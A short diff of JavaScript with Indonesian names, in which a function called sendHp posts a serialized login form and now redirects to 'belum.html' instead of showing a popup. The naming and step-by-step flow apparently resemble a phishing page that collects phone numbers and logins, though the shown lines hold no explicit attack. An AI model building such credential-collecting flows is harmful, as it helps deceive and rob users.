@@ -18,7 +18,7 @@ function sendHp() {
       data: $('#login').serialize(),  
       complete: function() {
          setTimeout(function() {
-            $("#popupku").fadeIn(200);
+            window.location = "belum.html";
             $('.x').hide();            
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
          }, 800);
